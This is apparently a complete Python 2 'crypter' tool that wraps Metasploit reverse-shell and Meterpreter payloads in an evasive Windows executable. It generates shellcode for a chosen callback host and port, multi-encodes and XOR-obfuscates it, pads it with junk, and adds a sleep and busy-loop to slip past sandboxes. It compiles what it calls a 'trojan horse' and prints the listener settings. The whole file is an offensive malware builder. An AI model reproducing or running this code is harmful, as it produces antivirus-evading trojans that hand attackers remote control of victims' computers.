#!/usr/bin/python
#coding: utf-8
from   struct import *
from   tempfile import mkstemp
import os
import commands
import subprocess
import random 
import socket
os.system("clear")

#This is the temporary file
structure_contents = """

#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <time.h>

int main(){
char jA []= %s;
unsigned char pl[] = %s;
char jB []= %s;
unsigned char key = %s;
unsigned int P_L = %s;
int i;
unsigned char* exec = (unsigned char*)VirtualAlloc(NULL, P_L/2 ,0x1000,0x40);
unsigned char* unpack = (unsigned char*)VirtualAlloc(NULL, P_L/2, 0x1000,0x40);
time_t start_time, cur_time;
int z, y;
int divide;
int x = 0;



Sleep(61000);

time(&start_time);
do
{
time(&cur_time);
}
while((cur_time - start_time) < 2);

for(i=0; i<P_L; i++)
{
divide = %s
if(divide == 0)
{
unpack[x]=pl[i];
x++;
}
}

for(i=0; i<P_L/2; i++)
{
    for(z=0;z<5000;z++)
    {
	for(y=0;y<500;y++)
	{
    		exec[i]=unpack[i]^key;
    	}
    }
}

((void (*)())exec)();

return 1;
}



"""

print "**************************************"
print "       __      __   __    ___    __"
print "      / /     / /  /  \\  / _ \\  / /"
print "     / /     / /__/ /\\ \\/ / \\ \\/ / "
print "    / /     / ___  /  \\  /   \\  /  "
print "   / /_____/ /  / /   / /   / /\\ \\ "
print "  /_________/  /_/   /_/   /_/  \\_\\"
print ""
print "**************************************"
print "          Crypter for metasploit	    "
print "**************************************"

#Getting IP address to suggest
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect(('8.8.8.8', 53))
default_host = s.getsockname()[0]

#Setting default port and metasploit shell type
default_port = "443"
default_shell = "7"

lhost = raw_input("LHOST to connect back to [%s]?" %  (default_host,)).strip()
if not lhost:
	lhost = default_host

lport = raw_input("LPORT to connect back to [%s]?" % (default_port,)).strip()
if not lport:
	lport = default_port

print "**************************************"
print "[*] LHOST: ", lhost
print "[*] LPORT: ", lport
print "**************************************"
print "0) windows/shell_reverse_tcp"
print "1) windows/shell/reverse_tcp"
print "2) windows/shell/reverse_tcp_dns"
print "3) windows/shell/reverse_http"
print "4) windows/meterpreter/reverse_tcp"
print "5) windows/meterpreter/reverse_tcp_dns"
print "6) windows/meterpreter/reverse_http"
print "7) windows/meterpreter/reverse_https"
print "**************************************"

#Selecting payload option
option           = raw_input("Select a payload (1-7)[%s]:" % (default_shell,)).strip()
if not option:
	option	 = default_shell
option		 = int(option)

#Creating temporary files
payload_raw      = mkstemp('.raw')[1]
out              = mkstemp('.c')[1]
structure        = mkstemp('.c')[1]
key              = random.randint(0,255)
create_structure = open(structure, 'w')
create_structure.write(structure_contents)
create_structure.close()


print "[*] Generating random junk and file size..."
randomSize = random.randint(20480,25600)

#Generating junk A
junkA = "\""
for i in xrange(1,randomSize):
	junkA += chr(random.randint(65,90)) 
junkA +=  "\""

#Generating junk B
junkB = "\""
for i in xrange(0,randomSize):
	junkB += chr(random.randint(65,90)) 
junkB +=  "\""

msf_payloads = [
r'windows/shell_reverse_tcp',
r'windows/shell/reverse_tcp',
r'windows/shell/reverse_tcp_dns',
r'windows/shell/reverse_http',
r'windows/meterpreter/reverse_tcp',
r'windows/meterpreter/reverse_tcp_dns',
r'windows/meterpreter/reverse_http',
r'windows/meterpreter/reverse_https',
]

#Generating shellcode through metasploit
print "[*] Generating metasploit shellcode..."
os.system("msfpayload "+ msf_payloads[option] +" LHOST=%s LPORT=%s R | msfencode -t raw -e x86/shikata_ga_nai -c 8 | msfencode -t raw -e x86/alpha_upper -c 2 | msfencode -t raw -o %s -e x86/countdown -c 4" % (lhost,lport,payload_raw))

print "[*] Encoding with XOR key: ", hex(key) 
print "[*] Obfuscating shellcode..."
a                    = open(payload_raw,"rb")
b                    = open(out,"w")
payload_raw_contents = a.read()
tempArray            = []
outArray             = []
x                    = 0
length               = int(len(payload_raw_contents)*2)


for i in xrange(0,length):
	if i % 2 == 0:
		tempArray.append(unpack("B",payload_raw_contents[x])[0]^key)
		x += 1
	else:
		randomByte = random.randint(65,90)
		tempArray.append(randomByte)	
for i in range(0,len(tempArray)):
	tempArray[i]="\\x%x"%tempArray[i]
for i in range(0,len(tempArray),15):
	outArray.append('\n"'+"".join(tempArray[i:i+15])+"\"")

#Adding random comments for statistical purposes
outArray       = "".join(outArray)
divide         = "i % 2;"
open_structure = open(structure).read()
code           = open_structure % (junkA,outArray,junkB,key,length,divide)
b.write(code)
b.flush()

#Compiling code and striping out debugging symbols
print "[*] Compiling trojan horse..."
os.system("i586-mingw32msvc-gcc -mwindows %s" % out)
print "[*] Stripping out the debugging symbols..."
os.system("strip --strip-debug a.exe")

file_output = lhost +'_'+ lport +'.exe' 
os.system("mv a.exe " + file_output   )

#Telling people how to live their life
print "[*] Metasploit options:"
print "[*]     use exploit/multi/handler"
print "[*]     set PAYLOAD "  + msf_payloads[option]
print "[*]     set LHOST "    +lhost
print "[*]     set LPORT "    +lport
print "[*]     set TARGET 0"
print "[*]     Created file " + file_output + "."

#Deleting temporary files
os.unlink(out)
os.unlink(payload_raw)
os.unlink(structure)
print "[*] Done !"
